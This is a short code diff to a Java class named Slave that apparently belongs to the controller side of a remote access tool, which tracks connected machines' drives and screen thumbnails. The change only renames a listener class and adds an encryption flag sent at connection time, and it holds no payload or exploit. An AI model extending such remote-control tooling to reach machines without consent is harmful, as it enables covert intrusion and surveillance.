@@ -21,7 +21,7 @@ import com.redpois0n.common.os.OperatingSystem;
 import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.io.CustomStream;
 import com.redpois0n.net.ConnectionHandler;
-import com.redpois0n.net.Listener;
+import com.redpois0n.net.PortListener;
 import com.redpois0n.packets.Header;
 import com.redpois0n.packets.PacketBuilder;
 import com.redpois0n.packets.Packets;
@@ -46,7 +46,7 @@ public class Slave extends CustomStream implements Runnable {
 	private BufferedReader br;
 	private PrintWriter pw;
 
-	private Listener connection;
+	private PortListener connection;
 
 	private final List<String> queue = new ArrayList<String>();
 	private Drive[] drives;
@@ -89,7 +89,7 @@ public class Slave extends CustomStream implements Runnable {
 
 	private ImageIcon thumbnail = null;
 
-	public Slave(Listener connection, Socket socket) {
+	public Slave(PortListener connection, Socket socket) {
 		this.connection = connection;
 		this.socket = socket;
 		new Thread(this).start();
@@ -113,6 +113,8 @@ public class Slave extends CustomStream implements Runnable {
 
 			this.pw = new PrintWriter(dos, true);
 			this.br = new BufferedReader(new InputStreamReader(dis));
+			
+			writeBoolean(encryption);
 
 			while (true) {
 				String line = readLine();
@@ -285,11 +287,11 @@ public class Slave extends CustomStream implements Runnable {
 		return inputStream;
 	}
 
-	public Listener getConnection() {
+	public PortListener getConnection() {
 		return connection;
 	}
 
-	public void setConnection(Listener connection) {
+	public void setConnection(PortListener connection) {
 		this.connection = connection;
 	}
 
